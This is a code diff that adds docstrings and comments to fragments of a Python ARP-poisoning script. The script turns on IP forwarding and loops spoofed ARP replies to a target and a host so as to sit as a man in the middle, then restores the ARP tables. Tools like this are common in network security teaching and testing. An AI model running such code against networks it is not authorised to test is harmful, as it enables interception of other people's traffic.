@@ -5,7 +5,7 @@ arp_spoofing = True
 
 def enable_ip_route():
     """
-    Enables IP route ( IP Forward ) in linux-based distro
+    Enables IP route ( IP Forward )
     """
     file_path = "/proc/sys/net/ipv4/ip_forward"
     with open(file_path) as f:
@@ -63,8 +63,11 @@ def restore(target_ip, host_ip, verbose=True):
         print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
         
 def arp_poison(target,host,verbose=False):
+    """
+    Performs the arp poisoning to become a man in the middle
+    """
     enable_ip_route()
-    while arp_spoofing:
+    while arp_spoofing: # loop until the main thread sets a flag
         # telling the `target` that we are the `host`
         spoof(target, host, verbose)
         # telling the `host` that we are the `target`
@@ -76,5 +79,8 @@ def arp_poison(target,host,verbose=False):
     restore(host, target)
     
 def stop_poison():
+    """
+    Sets a flag to stop the arp poisoning
+    """
     global arp_spoofing
     arp_spoofing = False
